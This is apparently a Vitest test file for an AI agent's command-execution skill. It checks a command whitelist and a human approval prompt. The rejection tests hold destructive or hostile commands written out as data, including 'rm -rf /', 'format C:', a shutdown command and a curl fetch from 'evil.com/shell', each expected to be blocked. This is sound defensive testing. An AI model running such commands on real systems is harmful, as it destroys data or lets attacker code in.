import { describe, it, expect, vi, beforeEach } from "vitest";

// ============================================================
// Mock all external dependencies BEFORE import
// ============================================================

// Control HITL auto-response (y/n) per test
let hitlResponse = "y";

vi.mock("readline", () => {
    return {
        default: {
            createInterface: vi.fn(() => ({
                question: (query: string, cb: (answer: string) => void) => {
                    cb(hitlResponse);
                },
                close: vi.fn(),
            })),
        },
        createInterface: vi.fn(() => ({
            question: (query: string, cb: (answer: string) => void) => {
                cb(hitlResponse);
            },
            close: vi.fn(),
        })),
    };
});

vi.mock("child_process", () => {
    const mockExecFn = vi.fn();
    return {
        exec: mockExecFn,
    };
});

vi.mock("util", () => ({
    promisify: (fn: any) => {
        // Return a wrapper that converts callback-style exec to promise
        return async (...args: any[]) => {
            return new Promise((resolve, reject) => {
                fn(...args, (err: any, result: any) => {
                    if (err) reject(err);
                    else resolve(result);
                });
            });
        };
    },
}));

vi.mock("../../src/utils/logger", () => ({
    logger: {
        info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn(),
    },
}));

import { exec } from "child_process";
const mockExec = vi.mocked(exec);

// ============================================================
// Tests
// ============================================================
describe("ExecuteCommand Skill", () => {
    let executeCommand: (args: { command: string }) => Promise<string>;
    let metadata: any;

    beforeEach(async () => {
        vi.clearAllMocks();
        hitlResponse = "y"; // Default to approve

        const mod = await import("../../src/skills/ExecuteCommand");
        executeCommand = mod.execute;
        metadata = mod.metadata;
    });

    describe("metadata", () => {
        it("should export correct skill name", () => {
            expect(metadata.name).toBe("execute_command");
        });

        it("should require 'command' parameter", () => {
            expect(metadata.parameters.required).toContain("command");
        });
    });

    describe("Whitelist Security Filter", () => {
        it("should accept whitelisted 'ping' command", async () => {
            mockExec.mockImplementation(((cmd: string, cb: (err: any, result: any) => void) => {
                cb(null, { stdout: "Reply from 127.0.0.1", stderr: "" });
            }) as any);

            const result = await executeCommand({ command: "ping 127.0.0.1" });
            expect(result).toContain("Reply from");
        });

        it("should accept whitelisted 'git' command", async () => {
            mockExec.mockImplementation(((cmd: string, cb: (err: any, result: any) => void) => {
                cb(null, { stdout: "On branch main", stderr: "" });
            }) as any);

            const result = await executeCommand({ command: "git status" });
            expect(result).toContain("On branch");
        });

        it("should accept whitelisted 'npm' command", async () => {
            mockExec.mockImplementation(((cmd: string, cb: (err: any, result: any) => void) => {
                cb(null, { stdout: "openclaw-gateway@1.0.0", stderr: "" });
            }) as any);

            const result = await executeCommand({ command: "npm list" });
            expect(result).toContain("openclaw-gateway");
        });

        it("should accept whitelisted 'echo' command", async () => {
            mockExec.mockImplementation(((cmd: string, cb: (err: any, result: any) => void) => {
                cb(null, { stdout: "hello world", stderr: "" });
            }) as any);

            const result = await executeCommand({ command: "echo hello world" });
            expect(result).toContain("hello world");
        });

        it("should REJECT non-whitelisted 'rm' command", async () => {
            const result = await executeCommand({ command: "rm -rf /" });
            expect(result).toContain("BẢO MẬT TỪ CHỐI");
            expect(result).toContain("Whitelist");
            expect(mockExec).not.toHaveBeenCalled();
        });

        it("should REJECT 'powershell' command", async () => {
            const result = await executeCommand({ command: "powershell -c Get-Process" });
            expect(result).toContain("BẢO MẬT TỪ CHỐI");
            expect(mockExec).not.toHaveBeenCalled();
        });

        it("should REJECT 'curl' command", async () => {
            const result = await executeCommand({ command: "curl http://evil.com/shell" });
            expect(result).toContain("BẢO MẬT TỪ CHỐI");
            expect(mockExec).not.toHaveBeenCalled();
        });

        it("should REJECT 'shutdown' command", async () => {
            const result = await executeCommand({ command: "shutdown /s /t 0" });
            expect(result).toContain("BẢO MẬT TỪ CHỐI");
            expect(mockExec).not.toHaveBeenCalled();
        });

        it("should REJECT 'format' command", async () => {
            const result = await executeCommand({ command: "format C:" });
            expect(result).toContain("BẢO MẬT TỪ CHỐI");
        });
    });

    describe("Human-in-the-Loop (HITL)", () => {
        it("should REJECT command when user denies approval", async () => {
            hitlResponse = "n";

            const result = await executeCommand({ command: "ping 127.0.0.1" });
            expect(result).toContain("từ chối");
            expect(mockExec).not.toHaveBeenCalled();
        });

        it("should accept when user types 'yes'", async () => {
            hitlResponse = "yes";
            mockExec.mockImplementation(((cmd: string, cb: (err: any, result: any) => void) => {
                cb(null, { stdout: "OK", stderr: "" });
            }) as any);

            const result = await executeCommand({ command: "echo test" });
            expect(result).toContain("OK");
        });

        it("should reject on empty input (default deny)", async () => {
            hitlResponse = "";

            const result = await executeCommand({ command: "ls" });
            expect(result).toContain("từ chối");
        });
    });

    describe("Error Handling", () => {
        it("should return error message on command execution failure", async () => {
            mockExec.mockImplementation(((cmd: string, cb: (err: any, result: any) => void) => {
                const err = new Error("Command not found") as any;
                err.stdout = "";
                cb(err, null);
            }) as any);

            const result = await executeCommand({ command: "node script.js" });
            expect(result).toContain("thất bại");
        });
    });
});
